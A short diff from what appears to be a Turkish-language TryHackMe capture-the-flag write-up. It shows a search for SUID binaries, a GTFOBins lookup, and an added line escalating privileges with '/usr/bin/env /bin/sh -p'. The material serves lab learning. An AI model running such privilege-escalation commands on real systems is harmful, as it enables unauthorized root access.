@@ -219,4 +219,8 @@ find / -perm -04000 -type f 2>/dev/null
 Buradaki /usr/bin/env dikkatimi çekiyor ve gtfobins sitesine gidip yetki yükseltip yükseltemeyeceğime bakıyorum.
 
 
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Anonymous/images/a4.png?raw=true)
 
+
+
+- /usr/bin/env /bin/sh -p komutu ile yetkimizi yükseltelim.
